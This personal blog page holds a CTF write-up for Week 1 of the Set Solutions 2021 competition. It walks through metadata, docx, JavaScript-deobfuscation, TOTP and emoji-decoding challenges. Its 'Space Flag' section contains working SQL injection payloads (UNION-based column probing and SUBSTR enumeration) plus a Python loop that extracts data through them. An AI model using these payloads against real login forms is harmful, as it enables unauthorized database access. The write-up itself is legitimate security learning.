<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="Adin Drabkin">
    <meta name="description" content="Quick Navigation
Week 2 \ Week 3 \ Week 4 Uniform Fashion Challenge description:">
    <meta name="keywords" content="">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Set Solutions CTF 2021 Week 1"/>
<meta name="twitter:description" content="Quick Navigation
Week 2 \ Week 3 \ Week 4 Uniform Fashion Challenge description:"/>

    <meta property="og:title" content="Set Solutions CTF 2021 Week 1" />
<meta property="og:description" content="Quick Navigation
Week 2 \ Week 3 \ Week 4 Uniform Fashion Challenge description:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://adindrabkin.com/blog/set-solutions-ctf-2021-week1/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2021-11-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-11-22T00:00:00+00:00" />


    <title>
  Set Solutions CTF 2021 Week 1 Â· Adin Drabkin
</title>

    
      <link rel="canonical" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week1/">
    

    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="/css/coder.min.7b314bd953f9bf97050dc5a58a3bc9cea394b9438d373447ddfe7365d5efe091.css" integrity="sha256-ezFL2VP5v5cFDcWlijvJzqOUuUONNzRH3f5zZdXv4JE=" crossorigin="anonymous" media="screen" />
    

    

    
      
        
        
        <link rel="stylesheet" href="/css/coder-dark.min.ccbbada2e264e4fdbf9b2181cccc2cdb289a63dc9520a1e96ac2b9a45778df29.css" integrity="sha256-zLutouJk5P2/myGBzMws2yiaY9yVIKHpasK5pFd43yk=" crossorigin="anonymous" media="screen" />
      
    

    

    

    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.111.3">
  </head>

  
  
    
  
  <body class="preload-transitions colorscheme-auto">
    
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      Adin Drabkin
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/" >Home</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/about/" >About</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/blog/" >Blog</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/tools/" >Tools</a>
          </li>
        
      
        
    </ul>
  
</section>
</nav>

      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week1/">
          Set Solutions CTF 2021 Week 1
        </a>
      </h1>
    </header>

    <p><strong>Quick Navigation</strong><br>
<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
 \
<a href="/blog/set-solutions-ctf-2021-week3">Week 3</a>
 \
<a href="/blog/set-solutions-ctf-2021-week4">Week 4</a>
</p>
<h1 id="uniform-fashion">
  Uniform Fashion
  <a class="heading-link" href="#uniform-fashion">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Challenge description:</p>
<blockquote>
<p>FLOTUS has sent over these possible uniform samples. Make sure someone takes a good look.</p>
</blockquote>
<p>Challenge inline image: <code>uniformity.jpg</code></p>
<p>The challenge page displayed the image <code>uniformity.jpg</code> and no other information.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/uniformity.jpg"/>
</figure>

<p>Hoping for an easy metadata or stego challenge, I downloaded the image and ran <em>exiftool</em>. Luckyily, the metadata entry for <em>Creator</em> contained the flag.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/UniformFashionExifFlag.jpg"/>
</figure>

<p>Little did I know that being blessed with an easy photo-relaterd exif challenge would curse me with stego rabbit holes as the competition progressed.</p>
<h1 id="secret-squirrel">
  Secret Squirrel
  <a class="heading-link" href="#secret-squirrel">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Challenge description:</p>
<blockquote>
<p>The quieter you become, the more you are able to hear.</p>
</blockquote>
<p>Challenge attachment: <code>hidden.docx</code></p>
<p>Upon opening <em>hidden.docx</em>, Microsoft Word warned me of hidden text, asking if I wanted to proceed.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SecretSquirrelWordPrompt.jpg"/>
</figure>

<p>There of course was then hidden text on the document, which I selected with <em>command + a</em>. I pasted the text into my search bar (as to remove formatting), revealing the message &ldquo;There is more to this document than meets the eye&rdquo;.</p>
<p>Given that there was no warning of macros upon opening the document, my thought was to unzip it. A Word document acts as a zip file, and can be extracted, revealing its contents. A few files appeared, including &ldquo;extra&rdquo;, which had no extension. I <em>cat</em> the file, and a flag appeared!</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SecretSquirrelUnzippedFlag.jpg"/>
</figure>

<h1 id="rather-cryptic">
  Rather Cryptic
  <a class="heading-link" href="#rather-cryptic">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Challenge description:</p>
<blockquote>
<p><em>Intelligence has intercepted the following message:<br>
-the five boxing wizards jump quickly-<br>
What does it all mean???</em></p>
</blockquote>
<p>Challenge attachment: <code>itWasAliens</code></p>
<p><em>Rather Cryptic</em> presented the pangram <em>the five boxing wizards jump quickly</em>, a sentence which contains all letters of the English alphabet. Inspection of the page revealed that the pangram had the HTML element id of &ldquo;pangram&rdquo;, implying that understanding the pangram was part of the challenge.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/RatherCrypticInspectElement.jpg"
         alt="RatherCryptic Inspect Element"/>
</figure>

<p>Upon first look, the attachment <code>itWasAliens</code> was 67kb of obfuscated JavaScript, without formatting. To make comprehension easier, I used JSnice to format and annotate the file.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/RatherCrypticJSNice.jpg"/>
</figure>

<p>Once formatted, I opened the file and searched &ldquo;flag&rdquo;, hoping some variables would be in plaintext. Luckily, there was a flag variable, being set to various calculated indexes of a &ldquo;pangram&rdquo; variable. The pangram variable, in turn, was set to part of the current document.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>... pangram = elem[_0x2b18f4(-<span style="color:#ff0;font-weight:bold">0x14f</span>, -<span style="color:#ff0;font-weight:bold">0x1a2</span>, -<span style="color:#ff0;font-weight:bold">0x165</span>, <span style="color:#0ff;font-weight:bold">&#39;$Xih&#39;</span>, -<span style="color:#ff0;font-weight:bold">0xdc</span>) + _0x515361(<span style="color:#ff0;font-weight:bold">0x4f9</span>, <span style="color:#ff0;font-weight:bold">0x4aa</span>, <span style="color:#ff0;font-weight:bold">0x4bf</span>, <span style="color:#0ff;font-weight:bold">&#39;$fFd&#39;</span>, <span style="color:#ff0;font-weight:bold">0x3d9</span>) + <span style="color:#0ff;font-weight:bold">&#39;t&#39;</span>], flag = pangram[-<span style="color:#ff0;font-weight:bold">0x1db0</span> + -<span style="color:#ff0;font-weight:bold">0x5</span> * <span style="color:#ff0;font-weight:bold">0x56</span> + <span style="color:#ff0;font-weight:bold">0x2</span> * <span style="color:#ff0;font-weight:bold">0xfc1</span>] + pangram[<span style="color:#ff0;font-weight:bold">0x642</span> * <span style="color:#ff0;font-weight:bold">0x6</span> + <span style="color:#ff0;font-weight:bold">0xe6e</span> + -<span style="color:#ff0;font-weight:bold">0x33ef</span>] + ...
</span></span></code></pre></div><p>Knowing that the code was most likely using the pangram to create a flag, I copied only pangram and the relevant &ldquo;flag&rdquo; portion into a node session. Instantly, the flag appeared!</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/RatherCryptricDecoded.jpg"/>
</figure>

<h1 id="from-russia-with-love">
  From Russia with Love
  <a class="heading-link" href="#from-russia-with-love">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Challenge description:</p>
<blockquote>
<p>Yuri is here to &ldquo;help solidify US/Russian relations in space&rdquo;&hellip;<br>
&hellip;or is he a Russian spy?<br>
Login to his portal to find out!</p>
</blockquote>
<p>On the challenge page was a login portal titled &ldquo;Russia Federation VPN&rdquo; and a post-it note labeled &ldquo;TOTP Secret&rdquo;. The login portal required a username, password, and MFA token.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLoveVPN.jpg"/>
</figure>

<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLovePostIt.png"/>
</figure>

<p>Since the challenge involved a portion of custom HTML (rather than just the challenge description), I decided to inspect the page, and located Yuri&rsquo;s username <em>Yuri</em> and password <em>espionageandvodka</em>.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLoveInspectElement.jpg"/>
</figure>

<p>TOTP uses a seed (re: TOTP Secret) to generate login codes. Therefore, I would need a TOTP generator to utilize the information collected thus far. I googled &ldquo;TOTP calculator&rdquo; and clicked on the first result.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLoveTOTPGoogle.jpg"/>
</figure>

<p>I set the secret key to <em>3LBDJVKP6TJ4NUH6</em> and left the default number of digits (6), and a token appeared.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLoveTOTPGenerated.jpg"/>
</figure>

<p>I entered Yuri&rsquo;s information, along with a newely-generated TOTP token into the logon portal and clicked submit, revealing a flag!</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/FromRussiaWithLoveLoginSuccesful.jpeg"/>
</figure>

<h1 id="science-games">
  Science Games
  <a class="heading-link" href="#science-games">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Challenge Description:</p>
<blockquote>
<p>Nobody really cares about the science games, but it is fun to beat the Air Force. This challenge will test your ability to solve simple problems repeatedly. The problems will be simple, once you figure out how to read them.</p>
<p>Connect to the range at 18.224.78.17 port 1337</p>
</blockquote>
<p>Upon connected to <em>the range</em> I was given a python dictionary-formatted alphabet of hex to emoji and a message, consisting of emojis.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/ScienceGamesWelcome.jpg"/>
</figure>

<p>The message translated to &ldquo;Send back (character) to get the next character&rdquo;. Upon sending the desired character, a message would appear, containing the same instructions (but a varying character).</p>
<p>Using Python&rsquo;s pwntools module, I created a quick python script to interact with <em>the range</em>, concatenating each new character to a string.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwnlib.tubes.remote <span style="color:#fff;font-weight:bold">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IP = <span style="color:#0ff;font-weight:bold">&#34;18.224.78.17&#34;</span>
</span></span><span style="display:flex;"><span>PORT = <span style="color:#ff0;font-weight:bold">1337</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">class</span> Solver():
</span></span><span style="display:flex;"><span>    alpha2 = {} 
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">def</span> decode(self, inp):
</span></span><span style="display:flex;"><span>        decoded = <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">for</span> i in inp:
</span></span><span style="display:flex;"><span>            decoded += self.alpha2[i]
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">bytearray</span>.fromhex(decoded).decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">def</span> main(self):
</span></span><span style="display:flex;"><span>        conn = remote(IP, PORT)
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(conn.recvline())
</span></span><span style="display:flex;"><span>        r = conn.recvline()
</span></span><span style="display:flex;"><span>        alpha = <span style="color:#fff;font-weight:bold">eval</span>(r.decode(<span style="color:#0ff;font-weight:bold">&#39;utf8&#39;</span>).strip(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>).split(<span style="color:#0ff;font-weight:bold">&#34;: &#34;</span>, <span style="color:#ff0;font-weight:bold">1</span>)[<span style="color:#ff0;font-weight:bold">1</span>])
</span></span><span style="display:flex;"><span>        self.alpha2 = {v:k <span style="color:#fff;font-weight:bold">for</span> k,v in alpha.items()}
</span></span><span style="display:flex;"><span>        self.alpha2[<span style="color:#0ff;font-weight:bold">&#34; &#34;</span>] = <span style="color:#0ff;font-weight:bold">&#34; &#34;</span>  <span style="color:#007f7f"># add a space mapping</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(alpha)
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(conn.recvline())
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(conn.recvline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key = <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">True</span>:
</span></span><span style="display:flex;"><span>            r = conn.recvline()
</span></span><span style="display:flex;"><span>            inp = (r.decode(<span style="color:#0ff;font-weight:bold">&#39;utf8&#39;</span>).strip(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>))
</span></span><span style="display:flex;"><span>            dec = self.decode(inp)
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(dec)
</span></span><span style="display:flex;"><span>            k = (<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{</span>dec.split(<span style="color:#0ff;font-weight:bold">&#39; &#39;</span>)[<span style="color:#ff0;font-weight:bold">2</span>]<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>            key += k
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(key)
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] Sending </span><span style="color:#0ff;font-weight:bold">{</span>k<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>            conn.send(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{</span>k<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    Solver().main()
</span></span></code></pre></div><p>After some slight tweaks on how I was receiving and parsing characters, the script was functional, and the flag was obtained:</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/ScienceGamesSolving.jpg"/>
</figure>

<h1 id="space-flag">
  Space Flag
  <a class="heading-link" href="#space-flag">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p><em>note: I forgot to save the description and only took screenshots for parts of this challenge. Everything before &ldquo;back on track&rdquo; is probably nonsense unless you attempted this challenge</em></p>
<p>The Space Flag challenge contained a large, 1.4 MB PNG taken from Netflix&rsquo;s <em>Space Force</em>, followed by a login form titled &ldquo;Exosuite Management Login*.</p>
<p>Being the oblivious, rule-abiding player that I am, I took the rule regarding &ldquo;No attacking challenge infrastructure&rdquo; to include the <em>Exosuite Management Login</em> form. Recall how I mentioned the rabbit hole curse invoked by the first challenge? Here is where it happens. Feel free to skip ahead to &ldquo;Back on track&rdquo;.</p>
<h2 id="the-rabbit-hole">
  The rabbit hole
  <a class="heading-link" href="#the-rabbit-hole">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>First, I ran every stego tool I could find against the image. <em>pngcheck</em> report an error with the image, &ldquo;spaceflag.png  illegal (unless recently approved) unknown, public chunk iDOT&rdquo;. I started to read up on CTF challenges that involved fixing broken PNG chunks, in hope that a flag would appear over the image. No luck. An hour in, a stackexchange post revealed that MacOS has an undocumented quirk of adding <em>iDOT</em> to png images, despite it not being spec.</p>
<p>Next, I put my OSINT cap on and studied the plot of <em>Space Force</em> Episode 5: <em>Space Flag</em>. In episode 5, the Space Force is doing a drill (&ldquo;capture the flag&rdquo;) against the Air Force. The fight is close, but Space Force member Chan Kaifang uses a secret code to hinder the Air Force&rsquo;s ability. After tediously skipping through each frame of the scene, I discovered that the secret code was <em>literally</em> code, and not relevant to the challenge.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>QZN.run(roll_dice)
</span></span><span style="display:flex;"><span>dice_value=red
</span></span></code></pre></div><p>But wait&hellip; maybe QZN is related to the space force? A google search of <code>&quot;QZN&quot; space force</code> leads me to an official government publication about the real Space Forces&rsquo; budget.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SpaceForceRabbitHoleQZN.jpg"/>
</figure>

<p>At this point, I took a break for dinner, and reached out to a friend to clarify the scope of the challenge. I banged my head against my desk when they told me that the login form sent a POST request to an ec2, which was <em>technically</em> not considered part of the competition infrastructure.</p>
<h1 id="back-on-track">
  Back on track
  <a class="heading-link" href="#back-on-track">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Learning that the login form <em>was</em> in scope changed everything, as the flood gates for SQL injection and bruteforcing were open.</p>
<p>Entering &ldquo;username&rdquo; <code>a'; --</code> resulted in a &ldquo;Login Successful!&rdquo;, with direction that can be interpreted as the FLAG existing in the table CTF.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SpaceFlagLoginSuccess.jpg"/>
</figure>

<p>As this is a semi-blind SQL injection challenge, I wanted to verify a negative result. I sent a query which attempted to select from <code>MYTABLE</code>.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SpaceFlagSystemError.jpg"
         alt="SpaceFlag System Error"/>
</figure>

<p>An error was returned, meaning at least one of the following:</p>
<ol>
<li>MYTABLE does NOT exist and therefore the statement errored</li>
<li>MYTABLE does exist, however the underlying statement does not select three columns, and therefore the statement errored.</li>
</ol>
<p>I attempted iterations of the same query to ensure the query caused the error, rather than the syntax I used.</p>
<p>To confirm that the table CTF exists, and to get information on the underlying query structure, I attempted the query, appending <code>,null</code> to the union statement each time.</p>
<p><code>a' UNION SELECT null FROM CTF --</code>: **SYSTEM ERROR**<br>
<code>a' UNION SELECT null,null FROM CTF --</code>: **SYSTEM ERROR**<br>
<code>a' UNION SELECT null,null,null FROM CTF --</code>: Login Successful!</p>
<p>Success! the table CTF exists and the underlying statement probably looks similar to:</p>
<p><code>SELECT id,username,password FROM users WHERE username='{username}' AND password='{password}';</code></p>
<p>My query transforms the statement, assuming that each portion of the query statement is valid:</p>
<p><code>SELECT id,username,password FROM users WHERE username='a' UNION SELECT null,null,null FROM CTF --</code></p>
<p><code>a' UNION SELECT null,randomcolumn,null FROM CTF --</code>: **SYSTEM ERROR**<br>
<code>a' UNION SELECT null,flag,null FROM CTF --</code>: Login Successful!</p>
<p>Finally, it was time to get the flag. As the SQL injection is only semi-blind, I had no need for sleep statements, and could verify the results of a SUBSTR query by checking if the login page returned success. The base query looked like the following:</p>
<p><code>a' UNION SELECT 1,2,3 FROM CTF WHERE SUBSTR(FLAG, 1, len({test_flag})) = {test_flag} --</code></p>
<p>The following python script is a redone version of what was used to enumerate the flag. <code>valid_query</code> was another function which returned True if the query was valid.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> string
</span></span><span style="display:flex;"><span>CHARS = string.ascii_letters + string.digits + string.punctuation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>QUERY = <span style="color:#0ff;font-weight:bold">&#34;a&#39; UNION SELECT 1,2,3 FROM CTF WHERE SUBSTR(FLAG, 1, </span><span style="color:#0ff;font-weight:bold">{}</span><span style="color:#0ff;font-weight:bold">) = </span><span style="color:#0ff;font-weight:bold">{}</span><span style="color:#0ff;font-weight:bold"> --&#34;</span>
</span></span><span style="display:flex;"><span>FLAG = <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span> c in CHARS:
</span></span><span style="display:flex;"><span>        test_flag = FLAG + c
</span></span><span style="display:flex;"><span>        query = QUERY.format(<span style="color:#fff;font-weight:bold">len</span>(test_flag), test_flag)
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> valid_query(query, test_flag):
</span></span><span style="display:flex;"><span>            FLAG = test_flag
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Found: </span><span style="color:#0ff;font-weight:bold">{</span>FLAG<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">break</span>
</span></span></code></pre></div><p>For the sake of completeness, it is important to note that there are at least two main drawbacks with this script, when used outside of a straightforward CTF challenge:</p>
<ol>
<li>If two FLAG entries exist, being &ldquo;SSI{flag}&rdquo; and &ldquo;SSI{flag_fake}&rdquo;, only &ldquo;SSI{flag_fake}&rdquo; would be located.</li>
<li>If two FLAG entries being &ldquo;SelectMe&rdquo; and &ldquo;SSI{flag}&rdquo;, only &ldquo;SelectMe&rdquo; would be located.</li>
</ol>
<p>Issue 1 could be solved by adding a follow-up query, such as <code>a' UNION SELECT 1,2,3 FROM CTF WHERE FLAG = {test_flag} --</code>.</p>
<p>Issue 2 could be solved by:</p>
<ul>
<li>Using a queue to store test flags so the script continues testing after exhausting &ldquo;SelectMe&rdquo;</li>
<li>Containing the while loop in a function, recursively checking other options following the located substring.</li>
</ul>
<p>And for my own code embarrassment, here is the <em>only</em> photo I have of my original script running.</p>
<figure class="centered"><img src="/images/blog/SetSolutionsWeek1/SpaceFlagScriptRunning.jpg"
         alt="SpaceFlag Old Script"/>
</figure>

<p>In retrospect, sqlmap map would have significantly outperformed my python scripting abilities. However, my sqlmap knowledge at the time was rudimentary, and I was very close to the flag. After finished the challenge&ndash;and secured a prize&ndash;I redid the challenge with sqlmap, which only appeared to work on the password section.</p>
<p>Week 1 lessons learned: <strong>breadth</strong>, not <strong>depth</strong>. Do not commit to one vector (i.e stego) unless you are <em>certain</em> that other vectors have been <em>at least</em> considered.</p>
<p><strong>Quick Navigation</strong><br>
<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
 \
<a href="/blog/set-solutions-ctf-2021-week3">Week 3</a>
 \
<a href="/blog/set-solutions-ctf-2021-week4">Week 4</a>
</p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    Â©
    
    2025
     Adin Drabkin 
    Â·
    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
    
  </section>
</footer>

    </main>

    
      
      <script src="/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js" integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
